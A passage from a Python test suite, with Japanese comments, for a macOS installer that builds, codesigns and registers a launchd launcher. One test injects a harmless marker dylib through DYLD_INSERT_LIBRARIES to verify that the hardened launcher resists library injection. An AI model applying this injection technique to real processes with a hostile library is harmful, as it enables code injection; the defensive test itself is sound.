            "#include <unistd.h>\n"
            "__attribute__((constructor)) static void injected(void) { write(2, \"INJECTED\\n\", 9); }\n",
            encoding="utf-8",
        )
        dylib = self.tmp / "inj.dylib"
        self.assertEqual(run([str(CC), "-dynamiclib", "-o", str(dylib), str(inj_src)]).returncode, 0)
        env = {"PATH": BASE_PATH, "DYLD_INSERT_LIBRARIES": str(dylib)}

        # 対照: __RESTRICT の無い同じランチャーには差し込める (テストが空振りでない証拠)
        plain = self.tmp / "plain-launcher"
        compiled = run([
            str(CC), "-O2", f"-DIHEALTH_RUN_PATH={c_string(run_script_of(project))}",
            "-o", str(plain), str(LAUNCHER_SRC),
        ])
        self.assertEqual(compiled.returncode, 0, compiled.stderr)
        if "INJECTED" not in run([str(plain)], env=env).stderr:
            self.skipTest("この環境では DYLD_INSERT_LIBRARIES が効かない")

        result = run([str(launcher)], env=env)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertNotIn("INJECTED", result.stderr, "インストーラがビルドしたランチャーには差し込めない")
        self.assertEqual(result.stdout.splitlines(), [f"script={run_script_of(project)}"])

    def test_failed_codesign_keeps_the_previous_launcher_and_leaves_no_partial_files(self):
        project = make_project(self.tmp)
        proc = run_installer(project, self.home, "--build-launcher", str(self.out))
        self.assertEqual(build_state(proc).get("launcher"), "built", proc.stdout + proc.stderr)
        launcher = self.out / "ihealth-launcher"
        before = stat_key(launcher)
        stamp = (self.out / "ihealth-launcher.stamp").read_text(encoding="utf-8")

        change_launcher_behavior(project)
        failing = self.tmp / "failing-sign"
        failing.mkdir()
        write_script(failing / "codesign", "#!/bin/bash\nprintf '%s\\n' \"$*\" >> \"$0.ran\"\nexit 1\n")
        proc = run_installer(project, self.home, "--build-launcher", str(self.out), path=f"{failing}:{BASE_PATH}")
        self.assertEqual(proc.returncode, 1, proc.stdout + proc.stderr)
        self.assertEqual(build_state(proc), {"launcher": "fallback", "program": run_script_of(project)})
        self.assertIn("署名できませんでした", proc.stderr)
        self.assertIn(".ihealth-launcher.build", (failing / "codesign.ran").read_text(encoding="utf-8"),
                      "偽の codesign は、ビルドした作りかけのファイルに対して呼ばれた")
        self.assertEqual(
            sorted(p.name for p in self.out.iterdir()), ["ihealth-launcher", "ihealth-launcher.stamp"],
            "作りかけのファイルを残さない",
        )
        self.assertEqual(stat_key(launcher), before)
        self.assertEqual((self.out / "ihealth-launcher.stamp").read_text(encoding="utf-8"), stamp)

    def test_install_ends_with_the_next_steps_and_keeps_the_launcher(self):
        project = make_project(self.tmp)
        (project / ".env").write_text("IHEALTH_PUBLISHER=obsidian\n", encoding="utf-8")
        proc = self.install(project)
        uid = os.getuid()
        run_log = Path(run_script_of(project)).parent.parent / "logs" / "run.log"
        lines = proc.stdout.rstrip("\n").splitlines()
        tail = "\n".join(lines[-32:])
        # 実行するコマンドは、流れて見落とされないよう出力の最後にまとめて出る
        for command in (
            f'open -R "{self.launcher}"',
            f'open "{FDA_URL}"',
            f"launchctl kickstart -k gui/{uid}/{SERVICE}",
            f'launchctl print gui/{uid}/{SERVICE} | grep -E "^.(state|last exit code) = "',
            f'"{run_log}"',
        ):
            self.assertIn(command, tail)
        self.assertIn("【要対応】", tail, "ビルドしたら付与し直しを目立たせる")
        self.assertIn("health=complete", tail)
        self.assertIn("health=nodata", tail, "今日の分が nodata でも失敗ではないと伝える")
        self.assertIn("リマインダー", tail)
        self.assertIn("/bin/bash", tail, "以前の bash への許可は外してよいと伝える")
        self.assertTrue(lines[-1].startswith("====="), "次の手順の枠が最後の出力")
        self.assertLess(
            proc.stdout.index("launchctl 登録状況"), proc.stdout.index("open -R"),
            "登録状況などの情報は次の手順より前",
        )

        # 結果を確かめるコマンドは、どのシェルに貼り付けても必要な行だけを出す
        self.check_pasted_commands(
            tail, "launchctl print", ["\tstate = not running", "\tlast exit code = 0"],
        )
        run_log.parent.mkdir(exist_ok=True)
        run_log.write_text(obsidian_run_log(), encoding="utf-8")
        last_run = obsidian_run_log().splitlines()[3:]
        self.check_pasted_commands(
            tail, "awk", [line for line in last_run if "関係のない" not in line and "未確定の値" not in line],
        )

        with open(self.home / "Library" / "LaunchAgents" / PLIST_NAME, "rb") as fh:
            plist = plistlib.load(fh)
        self.assertEqual(plist["ProgramArguments"], [str(self.launcher)], "ランチャーだけで、引数は無い")
        self.assertEqual([entry["Hour"] for entry in plist["StartCalendarInterval"]], [7, 12, 21])
        calls = self.launchctl_log.read_text(encoding="utf-8").splitlines()
        self.assertIn(f"bootstrap gui/{uid} {self.home / 'Library' / 'LaunchAgents' / PLIST_NAME}", calls)
        first = stat_key(self.launcher)
        live_stamp = self.launcher.with_name("ihealth-launcher.stamp").read_text(encoding="utf-8")

        # 再実行: ランチャーは作り直さない (与えた許可が有効なまま)
        proc = self.install(project)
        tail = "\n".join(proc.stdout.rstrip("\n").splitlines()[-32:])
        self.assertNotIn("【要対応】", tail)
        self.assertIn("付与済みなら 3) から", tail)
        self.assertIn(f"launchctl kickstart -k gui/{uid}/{SERVICE}", tail)
        self.assertEqual(stat_key(self.launcher), first)

        # 登録済みのランチャーはコンパイラが無くても --print-plist に出る (作り直し不要なので)
        proc = run_installer(project, self.home, "--print-plist", extra_env={"IHEALTH_CC": "/nonexistent/cc"})
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertEqual(plistlib.loads(proc.stdout.encode("utf-8"))["ProgramArguments"], [str(self.launcher)])

        # 別の clone (worktree など) の --build-launcher は、登録済みのランチャーに触れない
        other = make_project(self.tmp, "worktree")
        proc = run_installer(other, self.home, "--build-launcher", str(self.out))
        self.assertEqual(build_state(proc).get("launcher"), "built", proc.stdout + proc.stderr)
        self.assertEqual(stat_key(self.launcher), first)
        self.assertEqual(self.launcher.with_name("ihealth-launcher.stamp").read_text(encoding="utf-8"), live_stamp)

    def test_install_without_a_compiler_explains_the_bash_fallback(self):
        project = make_project(self.tmp)
        proc = self.install(project, IHEALTH_CC="/nonexistent/cc")
        tail = "\n".join(proc.stdout.rstrip("\n").splitlines()[-32:])
        self.assertIn("xcode-select --install", tail)
        self.assertIn("/bin/bash", tail)
        self.assertIn(f'open "{FDA_URL}"', tail)
        self.assertIn(f"launchctl kickstart -k gui/{os.getuid()}/{SERVICE}", tail)
        with open(self.home / "Library" / "LaunchAgents" / PLIST_NAME, "rb") as fh:
            plist = plistlib.load(fh)
        self.assertEqual(plist["ProgramArguments"], [run_script_of(project)])

        # 単日の publisher (.env なし = notion) の確認コマンドも、最後の実行の行だけを出す
        run_log = Path(run_script_of(project)).parent.parent / "logs" / "run.log"
        run_log.write_text(single_day_run_log(), encoding="utf-8")
        self.check_pasted_commands(tail, "awk", single_day_run_log().splitlines()[2:4])


if __name__ == "__main__":
    unittest.main()
